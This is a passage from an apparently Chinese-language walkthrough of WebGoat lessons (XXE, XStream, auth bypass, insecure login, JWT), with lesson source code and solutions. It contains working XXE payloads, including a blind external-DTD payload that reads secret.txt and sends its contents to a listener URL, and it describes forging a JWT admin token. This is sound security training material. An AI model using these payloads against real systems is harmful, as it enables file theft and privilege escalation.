        String error = "";
        try {
            var comment = comments.parseXml(commentStr);
//            解析获得comment对象
            comments.addComment(comment,false);
            if (checkSolution(comment)){
                return success(this).build();
            }
        } catch (Exception e) {
            error = ExceptionUtils.getStackTrace(e);
        }
        return failed(this).output(error).build();
    }

    private boolean checkSolution(Comment comment) {
        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;
        boolean success = false;
        for (String directory : directoriesToCheck){
            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);
//            如果在评论中存在这些目录
        }
        return success;

    }
    @RequestMapping(path = "/xxe/sampledtd",consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseBody
    public String  getSampleDTDFile(){
        return """
                <?xml version="1.0" encoding="UTF-8"?>
                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
                %all;
                """;
    }
}
```

### CommentsCache

```java
package com.wanan.webgoat.lessons.xxe;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.commons.exec.OS;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.xml.bind.JAXBException;
import javax.xml.stream.XMLStreamException;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"xxe.hints.simple.xxe.1", "xxe.hints.simple.xxe.2", "xxe.hints.simple.xxe.3", "xxe.hints.simple.xxe.4", "xxe.hints.simple.xxe.5", "xxe.hints.simple.xxe.6"})
public class SimpleXXE extends AssignmentEndpoint {
    private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr","etc","var"};
//    定义好linux系统下的目录
    private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files", "pagefile.sys"};
//   win
    @Value("${webgoat.server.directory}")
    private String webGoatHomeDirectory;
//    获取运行路径
    @Value("${webgoat.landingpage.url}")
    private String webWolfURL;
//  获取webwolfurl
    @Autowired
    private CommentsCache comments;

    @PostMapping(path = "xxe/simple",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult createNameComment(HttpServletRequest request, @RequestBody String commentStr){
        String error = "";
        try {
            var comment = comments.parseXml(commentStr);
//            解析获得comment对象
            comments.addComment(comment,false);
            if (checkSolution(comment)){
                return success(this).build();
            }
        } catch (Exception e) {
            error = ExceptionUtils.getStackTrace(e);
        }
        return failed(this).output(error).build();
    }

    private boolean checkSolution(Comment comment) {
        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;
        boolean success = false;
        for (String directory : directoriesToCheck){
            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);
//            如果在评论中存在这些目录
        }
        return success;

    }
    @RequestMapping(path = "/xxe/sampledtd",consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseBody
    public String  getSampleDTDFile(){
        return """
                <?xml version="1.0" encoding="UTF-8"?>
                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
                %all;
                """;
    }
}
```

### Comment

```java
package com.wanan.webgoat.lessons.xxe;

import lombok.*;

import javax.xml.bind.annotation.XmlRootElement;

@Getter
@Setter
@AllArgsConstructor
@NoArgsConstructor
@XmlRootElement
// 类与xml文件进行映射
@ToString
public class Comment {
    private String user;
    private String dateTime;
    private String text;
}
```

### CommentsEndpoint

```java
package com.wanan.webgoat.lessons.xxe;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.awt.*;
import java.util.Collection;

@RestController
@RequestMapping("xxe/comments")
public class CommentsEndpoint {
    @Autowired
    private CommentsCache comments ;
    @GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public Collection<Comment> retrieveComments(){
        return comments.getComments();
    }
}
```

简单测试下

发现提交的是xml文件

![image-20220911145600036](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145600036.png)

新建一个文件

![image-20220911145702591](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145702591.png)

```xml
<?xml version="1.0"?>
<!DOCTYPE comment [  
<!ENTITY js SYSTEM "file:///D:/Download/1.txt"> ]>
<comment><text>&js;</text></comment>
```

读取下这个文件试试

![image-20220911145859718](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145859718.png)

![image-20220911145907661](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145907661.png)

发现成功回显

这题通过需要获取c盘下的指定目录名

![image-20220911151413385](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911151413385.png)

![image-20220911151501260](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911151501260.png)

### ContentTypeAssignment

```java
package com.wanan.webgoat.lessons.xxe;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import org.apache.commons.exec.OS;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"xxe.hints.content.type.xxe.1", "xxe.hints.content.type.xxe.2"})
public class ContentTypeAssignment extends AssignmentEndpoint {
    private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "etc", "var"};
    private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files", "pagefile.sys"};
    @Value("${webgoat.server.directory}")
    private String webGoatHomeDirectory;
    @Autowired
    private WebSession webSession;
    @Autowired
    private CommentsCache comments;

    @PostMapping(path = "xxe/content-type")
    @ResponseBody
    public AttackResult createNewUser(HttpServletRequest request, @RequestBody String commentStr , @RequestHeader("Content-Type")String contentType) throws Exception{
        AttackResult attackResult = failed(this).build();

        if (APPLICATION_JSON_VALUE.equals(contentType)){
            comments.parseJson(commentStr).ifPresent(c -> comments.addComment(c,true));
            attackResult = failed(this).feedback("xxe.content.type.feedback.json").build();
        }
        if (null != contentType && contentType.contains(MediaType.APPLICATION_XML_VALUE)){
            String error = "";
            try {
                Comment comment = comments.parseXml(commentStr);
                comments.addComment(comment,false);
                if (checkSolution(comment)){
                    attackResult = success(this).build();
                }
            }catch (Exception e){
                error = ExceptionUtils.getStackTrace(e);
                attackResult = failed(this).feedback("xxe.content.type.feedback.xml").output(error).build();
            }

        }
        return attackResult;
    }

    private boolean checkSolution(Comment comment) {
        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES:DEFAULT_WINDOWS_DIRECTORIES;
        boolean success = false;
        for (String directory : directoriesToCheck){
            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);
        }
        return success;

    }
}
```

![image-20220911153939378](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911153939378.png)

这个题目也不知道啥意思 不收json数据 但是前段发送的是json数据

![image-20220911154039782](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911154039782.png)

稍微修改一下

#### BlindSendFileAssignment

```java
package com.wanan.webgoat.lessons.xxe;

import com.wanan.webgoat.container.WebGoat;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;

import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.users.WebGoatUser;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Map;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.apache.commons.lang3.RandomStringUtils.randomAlphabetic;
import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@Slf4j
@RestController
@AssignmentHints({"xxe.blind.hints.1", "xxe.blind.hints.2", "xxe.blind.hints.3", "xxe.blind.hints.4", "xxe.blind.hints.5"})
public class BlindSendFileAssignment extends AssignmentEndpoint {
    private final String webGoatHomeDirectory;
    private final CommentsCache comments;
    private final Map<WebGoatUser,String > userToFileContents = new HashMap<>();


    public BlindSendFileAssignment(@Value("${webgoat.user.directory}") String webGoatHomeDirectory, CommentsCache comments) {
        this.webGoatHomeDirectory = webGoatHomeDirectory;
        this.comments = comments;
    }
    private void createSecretFileWithRandomContents(WebGoatUser user){
        var fileContents = "WebGoat 8.0 rocks... (" + randomAlphabetic(10) + ")";
        userToFileContents.put(user,fileContents);
        File targetDirectory = new File(webGoatHomeDirectory,"/XXE/" + user.getUsername());
        if (!targetDirectory.exists()){
            targetDirectory.mkdirs();
        }
        try {
            Files.writeString(new File(targetDirectory,"secret.txt").toPath(),fileContents,UTF_8);
//            这里是在初始化时创建flag文件
        }catch (IOException e){
            log.error("Unable to write 'secret.txt' to '{}",targetDirectory);
        }

    }

    @PostMapping(path = "xxe/blind",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult addComment(@RequestBody String commentStr){
        var fileContentsForUser = userToFileContents.getOrDefault(getWebSession().getUser(),"");
        if (commentStr.contains(fileContentsForUser)){
            return success(this).build();
        }
        try {
            Comment comment = comments.parseXml(commentStr);
            if (fileContentsForUser.contains(comment.getText())){
                comment.setText("Nice try, you need to send the file to WebWolf");
            }
            comments.addComment(comment,false);
        }catch (Exception e){
            return failed(this).output(e.toString()).build();
        }
        return failed(this).build();
    }
    @Override
    public void initialize(WebGoatUser user){
        comments.reset(user);
        userToFileContents.remove(user);
        createSecretFileWithRandomContents(user);
    }
}
```

先说过程 后解释

创建一个eval.dtd文件 

这里一看就是向外面带出数据的

```
<!ENTITY % payload  "<!ENTITY send SYSTEM 'http://127.0.0.1:9090/landing?text=%file;'>">
```

通过webwolf上传并获取路径信息

![image-20220911180913447](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911180913447.png)

```
http://127.0.0.1:9090/files/123456/eval.dtd
```

```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///C:/Users/14980/.webgoat-8.2.3-SNAPSHOT/XXE/123456/secret.txt">
<!ENTITY % zxcv SYSTEM "http://127.0.0.1:9090/files/123456/eval.dtd">
%zxcv;
%payload;
]>
<comment><text>&send;</text></comment>
```

这里首先去获取一下secret.txt 文件内容 接着去获取一个dtd文件 在下面的&send;就是引用 eval.dtd中的内容

这样就会接收到请求了

![image-20220911181107673](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911181107673.png)

提交即可

![image-20220911181156536](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911181156536.png)

## vulnerable_components

### VulnerableComponents

```java
package com.wanan.webgoat.lessons.vulnerable_components;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class VulnerableComponents extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A6;
    }

    @Override
    public String getTitle() {
        return "vulnerable-components.title";
    }
}
```

这一关是前端组件 不需要后端代码

![image-20220911182441815](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911182441815.png)

### VulnerableComponentsLesson

### ContactImpl

```java
package com.wanan.webgoat.lessons.vulnerable_components;

import lombok.Data;

@Data
public class ContactImpl  implements Contact{
    private Integer id;
    private String firstName;
    private String lastName;
    private String email;
}
```

### Contact

```java
package com.wanan.webgoat.lessons.vulnerable_components;

public interface Contact {
    public Integer getId();
    public void setId(Integer id);
    public String getFirstName();
    public void setFirstName(String firstName);
    public String getLastName();
    public void setLastName(String lastName);
    public String getEmail();
    public void setEmail(String email);

}
```

### VulnerableComponentsLesson

```java
package com.wanan.webgoat.lessons.vulnerable_components;

import com.thoughtworks.xstream.XStream;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.commons.lang3.StringUtils;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"vulnerable.hint"})
public class VulnerableComponentsLesson extends AssignmentEndpoint {

    @PostMapping("/VulnerableComponents/attack1")
    public @ResponseBody
    AttackResult completed(@RequestParam String payload) {
        XStream xstream = new XStream();
        xstream.setClassLoader(Contact.class.getClassLoader());
        xstream.alias("contact", ContactImpl.class);
        xstream.ignoreUnknownElements();
        Contact contact = null;

        try {
            if (!StringUtils.isEmpty(payload)) {
                payload = payload.replace("+", "").replace("\r", "").replace("\n", "").replace("> ", ">").replace(" <", "<");
            }
            contact = (Contact) xstream.fromXML(payload);
        } catch (Exception ex) {
            return failed(this).feedback("vulnerable-components.close").output(ex.getMessage()).build();
        }

        try {
            if (null != contact) {
                contact.getFirstName();
            }
            if (!(contact instanceof ContactImpl)) {
                return success(this).feedback("vulnerable-components.success").build();
            }
        } catch (Exception e) {
            return success(this).feedback("vulnerable-components.success").output(e.getMessage()).build();
        }
        return failed(this).feedback("vulnerable-components.fromXML").feedbackArgs(contact).build();
    }
}
```

这里可能是由于java版本的问题 不可以创建XStream()对象我们先放一下 回头再看

主要讲了一个cve 其中也写了只在使用docker镜像时有效

![image-20220911192236151](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911192236151.png)

## auth_bypass

### AuthBypass

```java
package com.wanan.webgoat.lessons.auth_bypass;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class AuthBypass extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A7;
    }

    @Override
    public String getTitle() {
        return "auth-bypass.title";
    }
}
```

### VerifyAccount

```java
package com.wanan.webgoat.lessons.auth_bypass;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import com.wanan.webgoat.container.session.WebSession;
import org.jcodings.util.Hash;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.rmi.ServerException;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@AssignmentHints({"auth-bypass.hints.verify.1", "auth-bypass.hints.verify.2", "auth-bypass.hints.verify.3", "auth-bypass.hints.verify.4"})
public class VerifyAccount extends AssignmentEndpoint {
    @Autowired
    private WebSession webSession;
    @Autowired
    UserSessionData userSessionData;

    @PostMapping(path = "/auth-bypass/verify-account",produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(@RequestParam String userId, @RequestParam String verifyMethod, HttpServletRequest req)throws ServerException , IOException{
        AccountVerificationHelper verificationHelper = new AccountVerificationHelper();
        Map<String,String> submittedAnswers = parseSecQuestions(req);
        if (verificationHelper.didUserLikelyCheat((HashMap) submittedAnswers)){
//            判断用户是否作弊
            return failed(this).feedback("verify-account.cheated")
                    .output("Yes, you guessed correctly,but see the feedback message")
                    .build();
        }

        if (verificationHelper.verifyAccount(Integer.valueOf(userId),(HashMap)submittedAnswers)){
            userSessionData.setValue("account-verified-id",userId);
            return success(this).feedback("verify-account.success").build();
        }else {
            return failed(this).feedback("verify-account.failed").build();
        }
    }

    private Map<String, String> parseSecQuestions(HttpServletRequest req) {
        Map<String,String> userAnswers = new HashMap<>();
        List<String > paramNames = Collections.list(req.getParameterNames());
        for (String paramName : paramNames){
            if (paramName.contains("secQuestion")){
                userAnswers.put(paramName,req.getParameter(paramName));
            }
        }
        return (HashMap) userAnswers;
    }

}
```

### AccountVerificationHelper

```java
package com.wanan.webgoat.lessons.auth_bypass;

import java.util.HashMap;
import java.util.Map;

public class AccountVerificationHelper {
    private static final Integer verifyUserId = 1223445;
    private static final Map<String ,String > userSecQuestions = new HashMap<>();

    static {
        userSecQuestions.put("secQuestion0","Dr. Watson");
        userSecQuestions.put("secQuestion1","Baker Street");

    }
    private static final Map<Integer,Map> secQuestionStore = new HashMap<>();
    static {
        secQuestionStore.put(verifyUserId,userSecQuestions);
    }
    public boolean didUserLikelyCheat(HashMap<String ,String> submittedAnswers){
        boolean likely = false;
        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()){
//            如果两个数量相同
            likely = true;
        }
        if ((submittedAnswers.containsKey("secQuestion0")&& submittedAnswers.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0")))
                && (submittedAnswers.containsKey("secQuestion1") && submittedAnswers.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) ){
//            这里代表的是你不能直接看源码去拿到这两个值
            likely = true;
        }else {
            likely = false;
        }
        return likely;
    }
    public boolean  verifyAccount(Integer userId,HashMap<String,String > submittedQuestions){
        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()){
//            如果传入的答案和标准答案数量不相同
            return false;
        }
        if (submittedQuestions.containsKey("secQuestion0") && !submittedQuestions.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))){
//            如果有这个值 并且和原先的值不相同
            return false;
        }
        if (submittedQuestions.containsKey("secQuestion1") && !submittedQuestions.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) {
            return false;
        }
        return true;
    }
}
```

这里只要两个没有预定义过的就可以绕过了

![image-20220911201509403](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911201509403.png)

## insecure_login

### InsecureLogin

```java
package com.wanan.webgoat.lessons.insecure_login;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class InsecureLogin extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A7;
    }

    @Override
    public String getTitle() {
        return "insecure-login.title";
    }
}
```

### InsecureLoginTask

```java
package com.wanan.webgoat.lessons.insecure_login;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.http.HttpStatus;
import org.springframework.web.bind.annotation.*;

@RestController
public class InsecureLoginTask extends AssignmentEndpoint {
    @PostMapping("/InsecureLogin/task")
    @ResponseBody
    public AttackResult completed(@RequestParam String username,@RequestParam String password){
        if ("CaptainJack".equals(username) && "BlackPearl".equals(password)){
            return success(this).build();
        }
        return failed(this).build();
    }
    @PostMapping("/InsecureLogin/login")
    @ResponseStatus(HttpStatus.ACCEPTED)
    public void login(){

    }
}

```

![image-20220911203004937](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911203004937.png)

输入就过

![image-20220911203105064](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911203105064.png)

## jwt

### JWT

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class JWT extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A7;
    }

    @Override
    public String getTitle() {
        return "jwt.title";
    }
}
```

### JWTDecodeEndpoint

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class JWTDecodeEndpoint extends AssignmentEndpoint {
    @PostMapping("/JWT/decode")
    @ResponseBody
    public AttackResult decode(@RequestParam("jwt-encode-user") String user){
        if ("user".equals(user)){
            return success(this).build();
        }else {
            return failed(this).build();
        }
    }
}
```

直接打开webwolf 解码一下即可

![image-20220911210122147](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911210122147.png)

![image-20220911210131002](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911210131002.png)

### JWTVotesEndpoint

### votes

#### Vote

```java
package com.wanan.webgoat.lessons.jwt.votes;

import com.fasterxml.jackson.annotation.JsonView;
import lombok.Getter;

@Getter
public class Vote {
    @JsonView(Views.GuestView.class)
//    表示只能反序列成这个类?
    private final String title;
    @JsonView(Views.GuestView.class)
    private final String information;
    @JsonView(Views.GuestView.class)
    private final String imageSmall;
    @JsonView(Views.GuestView.class)
    private final String imageBig;
    @JsonView(Views.UserView.class)
    private int numberOfVotes;
    @JsonView(Views.UserView.class)
    private boolean votingAllowed = true;
    @JsonView(Views.UserView.class)
    private long average = 0;

    public Vote(String title, String information, String imageSmall, String imageBig, int numberOfVotes,int totalVotes) {
        this.title = title;
        this.information = information;
        this.imageSmall = imageSmall;
        this.imageBig = imageBig;
        this.numberOfVotes = numberOfVotes;
        this.average = calculateStars(totalVotes);
    }
    
    public void incrementNumberOfVotes(int totalVotes){
        this.numberOfVotes = this.numberOfVotes +1;
        this.average = calculateStars(totalVotes);
    }
    
    public void reset(){
        this.numberOfVotes = 1;
        this.average = 1;
    }

    private long calculateStars(int totalVotes) {
        return Math.round(((double) numberOfVotes / (double) totalVotes) * 4);
    }
}
```

#### Views

```java
package com.wanan.webgoat.lessons.jwt.votes;

public class Views {
    public interface GuestView{
        
    }
    public interface UserView extends GuestView{
        
    }
}

```

### JWTVotesEndpoint

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.jwt.votes.Views;
import com.wanan.webgoat.lessons.jwt.votes.Vote;
import io.jsonwebtoken.*;
import io.jsonwebtoken.impl.TextCodec;
import org.apache.commons.lang3.StringUtils;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.http.converter.json.MappingJacksonValue;
import org.springframework.web.bind.annotation.*;

import javax.annotation.PostConstruct;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.sql.Date;
import java.time.Duration;
import java.time.Instant;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;

import static java.util.Comparator.comparingLong;
import static java.util.Optional.ofNullable;
import static java.util.stream.Collectors.toList;

@RestController
@AssignmentHints({"jwt-change-token-hint1", "jwt-change-token-hint2", "jwt-change-token-hint3", "jwt-change-token-hint4", "jwt-change-token-hint5"})
public class JWTVotesEndpoint extends AssignmentEndpoint {
    public static final String JWT_PASSWORD = TextCodec.BASE64.encode("victory");
    private static String validUsers = "TomJerrySylvester";
    private static int totalVotes = 38929;
    private Map<String, Vote> votes = new HashMap<>();

    @PostConstruct
    public void initVotes() {
//        存入几个初始值
        votes.put("Admin lost password", new Vote("Admin lost password",
                "In this challenge you will need to help the admin and find the password in order to login",
                "challenge1-small.png", "challenge1.png", 36000, totalVotes));
        votes.put("Vote for your favourite",
                new Vote("Vote for your favourite",
                        "In this challenge ...",
                        "challenge5-small.png", "challenge5.png", 30000, totalVotes));
        votes.put("Get it for free",
                new Vote("Get it for free",
                        "The objective for this challenge is to buy a Samsung phone for free.",
                        "challenge2-small.png", "challenge2.png", 20000, totalVotes));
        votes.put("Photo comments",
                new Vote("Photo comments",
                        "n this challenge you can comment on the photo you will need to find the flag somewhere.",
                        "challenge3-small.png", "challenge3.png", 10000, totalVotes));
    }

    @GetMapping("/JWT/votings/login")
    public void login(@RequestParam("user") String user, HttpServletResponse response) {
        if (validUsers.contains(user)) {
//            这里如果user是预定义的 几个的话
            Claims claims = Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(10))));
//            设置jwt发布时间戳
            claims.put("admin", "false");
            claims.put("user", user);
            String token = Jwts.builder()
                    .setClaims(claims)
                    .signWith(SignatureAlgorithm.HS512, JWT_PASSWORD)
//                    hs512 加密 密钥是victory
                    .compact();
            Cookie cookie = new Cookie("access_token", token);
//            添加cookie进去
            response.addCookie(cookie);
            response.setStatus(HttpStatus.OK.value());
            response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        } else {
            Cookie cookie = new Cookie("access_token", "");
            response.addCookie(cookie);
            response.setStatus(HttpStatus.OK.value());
            response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        }
    }

    @GetMapping("/JWT/votings")
    @ResponseBody
    public MappingJacksonValue getVotes(@CookieValue(value = "access_token", required = false) String accessToken) {
        MappingJacksonValue value = new MappingJacksonValue(votes.values().stream().sorted(comparingLong(Vote::getAverage).reversed()).collect(toList()));
        if (StringUtils.isEmpty(accessToken)) {
//            如果token是空的
            value.setSerializationView(Views.GuestView.class);
        } else {
            try {
                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
//                设置密钥去解密
                Claims claims = (Claims) jwt.getBody();
                String user = (String) claims.get("user");
                if ("Guest".equals(user) || !validUsers.contains(user)) {
                    value.setSerializationView(Views.GuestView.class);

                } else {
                    value.setSerializationView(Views.UserView.class);
                }

            } catch (JwtException e) {
                value.setSerializationView(Views.GuestView.class);
            }
        }
        return value;
    }

    @PostMapping(value = "/JWT/votings/{title}")
    @ResponseBody
    @ResponseStatus(HttpStatus.ACCEPTED)
    public ResponseEntity<?> vote(@PathVariable String title,@CookieValue(value = "access_token",required = false)String accessToken){
        if (StringUtils.isEmpty(accessToken)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }else {
            try {
                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
                Claims claims =(Claims) jwt.getBody();
                String user = (String) claims.get("user");
                if (!validUsers.contains(user)){
                    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
                }else {
                    ofNullable(votes.get(title)).ifPresent(v -> v.incrementNumberOfVotes(totalVotes));
//                    这一步首先是获取投票的是哪一个并且将票数取出来接着进行 +1操作
                    return ResponseEntity.accepted().build();
                }
            }catch (JwtException e){
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            }
        }
    }

    @PostMapping("/JWT/votings")
    @ResponseBody
    public AttackResult restVotes(@CookieValue(value = "access_token",required = false)String accessToken){
        if (StringUtils.isEmpty(accessToken)){
            return failed(this).feedback("jwt-invalid-token").build();
        }else {
            try {
                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
                // 注意这个parse函数 其实是不安全的 后面会讲到
                Claims claims = (Claims) jwt.getBody();
                boolean isAdmin = Boolean.valueOf((String)claims.get("admin"));
//                对签名进行解密后确认是否是admin
                if (!isAdmin){
                    return failed(this).feedback("jwt-only-admin").build();
                }else {
                    votes.values().forEach(vote -> vote.reset());
                    return success(this).build();
                }
            }catch (JwtException e){
                return failed(this).feedback("jwt-invalid-token").output(e.toString()).build();
            }
        }
    }

}
```

这里的目的是让我们 删除重置投票

这里先哪一个 token

![image-20220912184217753](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184217753.png)

![image-20220912184256942](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184256942.png)

注意这里多加了个 .

![image-20220912184337398](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184337398.png)

### JWTQuiz

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

@RestController
public class JWTQuiz extends AssignmentEndpoint {
    private final String[] solutions = {"Solution 1","Solution 2"};
    private final boolean[] guesses = new boolean[solutions.length];

    @PostMapping("/JWT/quiz")
    @ResponseBody
    public AttackResult completed(@RequestParam String[] question_0_solution, @RequestParam String[] question_1_solution){
        int correctAnswers = 0;
        String[] givenAnswers = {question_0_solution[0],question_1_solution[0]};

        for (int i= 0; i< solutions.length;i++){
            if (givenAnswers[i].contains(solutions[i])){
                correctAnswers++;
                guesses[i] = true;

            }else {
                guesses[i] = false;
            }
        }
        if (correctAnswers == solutions.length){
            return success(this).build();
